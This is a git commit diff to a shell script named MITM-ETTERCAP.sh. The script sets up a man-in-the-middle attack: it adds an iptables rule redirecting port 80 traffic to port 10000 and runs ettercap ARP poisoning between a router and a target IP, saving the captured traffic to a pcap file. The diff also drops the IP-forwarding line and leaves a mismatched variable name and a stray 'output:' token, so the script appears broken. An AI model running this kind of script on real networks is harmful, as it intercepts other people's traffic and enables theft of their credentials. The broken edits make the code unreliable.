df4c363fbd4a07ed8f22c9c6e822dcd4660f2a07
smoz1986 <smoz1986@users.noreply.github.com>
2016-02-27 15:23:22 +0000

    Update MITM-ETTERCAP.sh

--- MITM-ETTERCAP.sh
+++ MITM-ETTERCAP.sh
@@ -2,7 +2,6 @@
 # start Ettercap text
  
 echo first configuring IP tables…
-echo 1 > /proc/sys/net/ipv4/ip_forward
 echo Enter interface for IP tables i.e. eth0, wlan0 etc
 read -p 'Interface: ' intvar
 iptables -A PREROUTING -t nat -i $intvar -p tcp --dport 80 -j REDIRECT --to-port 10000
@@ -17,7 +16,7 @@ then
 	read -p 'Target 1 IP: ' routervar
 	echo Enter Target 2 IP - if required
 	read -p 'Target 2 IP: ' targetvar
-	ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+	ettercap -T -i $intervar -M ARP -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/ output:
 else
     echo ettercap cancelled
 echo finished
